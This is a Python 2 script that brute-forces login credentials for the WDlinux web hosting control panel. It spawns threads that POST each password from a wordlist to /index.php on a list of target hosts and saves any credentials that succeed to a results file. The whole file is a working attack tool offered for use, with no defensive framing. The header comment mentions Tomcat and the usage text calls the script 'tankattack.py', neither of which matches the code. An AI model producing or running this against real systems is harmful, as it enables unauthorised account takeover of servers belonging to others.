#!/usr/bin/env python  
# -*- coding: utf-8 -*-  
# Functions: Idenfy tomcat password
# Code By Ridter

import threading, time, random, sys, base64,httplib
from copy import copy
import re
from collections import defaultdict, deque
import urllib2
import urllib 
import hashlib
import argparse
import textwrap

class wdlinuxbrute(threading.Thread):
        def __init__(self,server,port,path,user,password):
                threading.Thread.__init__(self)
                self.host = str(server)
                self.port = str(port)
                self.path = str(path)
                self.user = str(user)
                self.password = str(password)
                self.userAgent = "Mozilla/5.0 (Windows NT 5.1; rv:26.0) Gecko/20100101 Firefox/26.0"

        
        def writeresult(self,record):
                fp = open('Result.txt','a+')
                fp.writelines(record+'')
                fp.close()
        
        def run(self):
 #               print self.getName(),  "-- created."  
                site = "http://"+self.host+':'+self.port
                para = urllib.urlencode({'username':self.user,'passwd':self.password,'Submit_login':''})
                req = urllib2.Request(site+self.path)
                try:
                    fd = urllib2.urlopen(req,para)
                    data = fd.read()
#                    print data
                    match = re.search('<script language="javascript">location.href', data)
                    if match:
                        if fd.getcode() == 200:
                            print "\t\n[OK] HOST:",self.host+":"+self.port,"Username:",self.user,"Password:",self.password,"\n"
                            self.writeresult("http://"+self.host+":"+self.port+"----->"+self.user+":"+self.password+"\n")
                        else:
                            print "\t\nThis is not WDlinux"
                    else:
                        pass
                except:
                    print '\t\n[+] site: %s \t\n[+] Error: seems to be down' % site                 
def timer():
    now = time.localtime(time.time())
    return time.asctime(now)

def getargs():
    parser = argparse.ArgumentParser(prog='wdlinux.py', formatter_class=argparse.RawTextHelpFormatter, description=textwrap.dedent('''\
    For Example:
    -----------------------------------------------------------------------------
    python tankattack.py <urlList> <port> <userlist> <wordlist>
    python tankattack.py --host ip.txt --port 8080 --user user.txt --pwd password.txt'''))
    parser.add_argument('--host', metavar='hostlist', type=str, help=' the hosts of target')
    parser.add_argument('--port', metavar='port', default=8080, type=str, help=' the web port')
    parser.add_argument('--user', metavar='name', type=str, help=' the name you are to crack')
    parser.add_argument('--pwd', metavar='passlist', type=str, help=' The directory of passworld files')
 
    print len(sys.argv[1:])
    if(len(sys.argv[1:]) / 2 != 4):
        sys.argv.append('-h')
    return parser.parse_args()

if __name__ == '__main__':
        paramsargs = getargs()
        try:
                username = paramsargs.user
        except(IOError):
                print "Error: Check your username \n"
                sys.exit(1)
   
        try:
                words = open(paramsargs.pwd, "r").readlines()
        except(IOError):
                print "Error: Check your wordlist path\n"
                sys.exit(1)
        
        try:
                port = paramsargs.port
        except(IOError):
                print "Error: Check your port\n"
 
        path = '/index.php'
        
        WEAK_PASSWORD = [p.replace('\n','') for p in words]
        accounts =deque()   #list数组
        
        for password in WEAK_PASSWORD:
            accounts.append((username,password))
        
        host_open = open(paramsargs.host, 'r')
        ip = [p.replace('\n','') for p in host_open]
        try:
            for server in ip:
                print "[+] Server:",server
                print "[+] Port:",port
                print "[+] Users Loaded:",username
                print "[+] Words Loaded:",len(WEAK_PASSWORD)
                
                for I in range(len(accounts)):
                        work = wdlinuxbrute(server,port,path,accounts[I][0],accounts[I][1])
                        work.setDaemon(1)
                        work.start()
                        time.sleep(0.01)
                print "\n[-] Done -",timer(),"\n" 
        except KeyboardInterrupt:
            print "exit..."